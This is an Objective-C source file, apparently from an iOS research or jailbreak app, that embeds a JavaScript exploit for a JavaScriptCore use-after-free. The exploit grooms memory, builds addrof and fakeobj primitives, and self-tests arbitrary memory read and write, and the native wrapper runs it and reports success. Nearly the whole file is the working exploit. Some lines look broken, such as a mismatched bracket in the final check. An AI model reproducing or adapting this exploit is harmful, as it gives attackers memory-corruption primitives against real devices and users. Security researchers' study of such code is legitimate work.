#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <JavaScriptCore/JavaScriptCore.h>
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <string.h>
#import <stdio.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// JSC read/write from addrof+fakeobj, without forging any PAC signature
// (the DarkSword "scribble" route, proven on iOS 26.1 with this same CVE).
//
// Runs in a JSContext (JavaScriptCore inside OUR process) -- NOT a WKWebView:
// on this build WebKit2 refuses to initialise inside a sideloaded app
// (SIGTRAP in WebKit::InitializeWebKit2), while JavaScriptCore works fine and the
// UAF trigger is pure JS with no DOM dependency.
// ===========================================================================
static const char *kScribble = R"JS(
(function () {
  var out = { step: [], exp: {} };
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var OFF = 0x0002000000000000n;
  var HDR = 0x07n | (0x2Bn << 40n) | (1n << 56n);   // ArrayWithDouble | ArrayType | White

  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A; let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);

  var W = null;
  for (let k = 0; k < 10000 && !W; ++k) {
    foo(false, 10, k % 5 + 1); rec(10000);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
    let fr = arr[arr_index].p1.p1;
    let noCow = 13.37;
    for (let i = 0; i < 16; ++i) {
      let c = [13.37, 2.2, 3.3, 4.4, noCow];
      if (fr[0] === 13.37) { W = { freed: fr, boxed: c, round: k }; break; }
    }
  }
  if (!W) { out.err = 'trigger did not fire'; return JSON.stringify(out); }
  out.step.push('UAF round=' + W.round);
  function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
  function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

  var holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
  var HA = addrof(holder), SA = addrof(scribble), gap = SA - HA;
  for (var t = 0; t < 60 && gap !== 0x40n && gap !== -0x40n; t++) {
    holder   = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    scribble = { p1: 2.2, p2: 2.2, p3: 2.2, p4: 2.2, p5: 2.2, p6: 2.2 };
    HA = addrof(holder); SA = addrof(scribble); gap = SA - HA;
  }
  out.gap = gap.toString();
  if (gap !== 0x40n && gap !== -0x40n) { out.err = 'groom failed'; return JSON.stringify(out); }
  out.step.push('groom ok gap=' + gap);

  scribble.p7 = 3.3; scribble[0] = 1.1;
  holder.p1 = itof(HDR);
  holder.p2 = scribble;
  var changeArr = fakeobj(HA - 1n + 0x10n + 1n);
  function setBtf(a) { changeArr[1] = itof(BigInt(a) + 0x10n); }

  // E2: does the element fast path ignore StructureID?
  var HDR_JUNK = HDR | 0xdeadbeefn;
  holder.p1 = itof(HDR_JUNK);
  var junkEl = null;
  try { junkEl = ftoi(changeArr[0]); } catch (e) { junkEl = 'threw'; }
  out.exp.elementPathIgnoresSID = (junkEl !== 'threw');
  holder.p1 = itof(HDR);

  function write64(addr, val) {
    setBtf(BigInt(addr));
    try { scribble.p7 = itof(BigInt.asUintN(64, BigInt(val))); return true; } catch (e) { return false; }
  }
  function read64(addr) {
    setBtf(BigInt(addr));
    try { return BigInt(ftoi(changeArr[0])); } catch (e) { return null; }
  }

  var ta = new BigUint64Array(16);
  ta[0] = 0x4142434445464748n;
  var w = write64(addrof(ta) - 1n + 0x18n, 0x0000000000010000n);
  out.lengthWrite = w;
  out.lengthAfter = ta.length;
  out.write = (w && ta.length === 65536);
  out.read = (ta[0] === 0x4142434445464748n);
  out.value = '0x' + ta[0].toString(16);
  out.step.push('primitive: write=' + out.write + ' read=' + out.read);
  return JSON.stringify(out);
})()
)JS";

// Run JS in a JSContext (JavaScriptCore, no WebKit2).  Returns the string result.
static NSString *RunJS(const char *js, int timeoutSec) {
    @autoreleasepool {
        JSContext *ctx = [[JSContext alloc] init];
        __block NSString *res = @"(no answer)";
        dispatch_semaphore_t s = dispatch_semaphore_create(0);
        [ctx evaluateScript:[NSString stringWithUTF8String:js]
        completionHandler:^(JSValue *v, JSValue *err) {
            res = [v isKindOfClass:[NSString class]] ? v : [[v description] ?: @"?" copy];
            if (err && ![err isUndefined]) res = [err toString] ?: @"js error";
            dispatch_semaphore_signal(s);
        }];
        dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, timeoutSec * NSEC_PER_SEC));
        return res;
    }
}

NSString *ModJscScribbleRW(void) {
    AveLog(@"    JSC scribble R/W: DarkSword route inside a JSContext (no WKWebView)");
    NSString *r = RunJS(kScribble, 240);
    AveLog([NSString stringWithFormat:@"    scribble result: %@", r]);
    AvePost([NSString stringWithFormat:@"SCRIBBLE %@", r]);
    if ([r containsString:@"\"write\":true"] && [r containsString:@"\"read\":true"]) {
        AveSetStatus(@"arbitrary R/W ACTIVE in our own process, no PAC needed");
        return @"ARBITRARY R/W ACTIVE on 23C5027f: read64/write64 self-tested";
    }
    if ([r containsString:@"\"groomFailed\"") return r;
    return r;
}
